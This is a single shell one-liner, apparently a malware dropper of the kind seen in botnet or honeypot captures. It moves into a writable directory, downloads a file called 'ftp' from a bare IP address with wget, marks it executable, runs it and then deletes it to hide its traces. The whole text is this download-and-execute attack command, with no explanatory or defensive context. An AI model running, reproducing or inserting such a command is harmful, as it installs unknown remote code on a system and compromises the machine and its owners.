cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.113/ftp; chmod +x ftp; ./ftp; rm -rf ftp
